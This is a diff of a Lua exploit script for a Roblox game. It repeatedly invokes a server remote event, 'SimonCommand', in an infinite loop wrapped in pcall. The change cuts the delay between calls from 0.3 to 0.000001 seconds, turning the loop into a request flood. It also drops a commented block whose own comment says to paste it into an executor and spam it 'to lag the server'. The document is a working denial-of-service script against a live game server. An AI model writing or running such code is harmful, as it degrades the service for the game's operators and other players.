@@ -13,32 +13,15 @@ end
 pcall(function() -- pcall to prevent the loop breaking
 	while true do
     	game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true,true,1)
-        task.wait(.3)
+        task.wait(.000001)
     	game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true,true,2)
-        task.wait(.3)
+        task.wait(.000001)
     	game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true,true,3)
-	task.wait(.3)
+	task.wait(.000001)
     	game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true,true,4)
-	task.wait(.3)
+	task.wait(.000001)
 	end
 end)
---[[
--- Paste this in your executor and spam it to lag the server
-for i = 1, 10000000000000000000000,.1 do
-pcall(function() -- pcall to prevent the loop breaking
-	while true do
-    	game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true,true,1)
-        task.wait(.3)
-    	game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true,true,2)
-        task.wait(.3)
-    	game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true,true,3)
-		task.wait(.3)
-    	game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true,true,4)
-		task.wait(.3)
-	end
-end)
-end
-	]]
-	
+
 		
 end
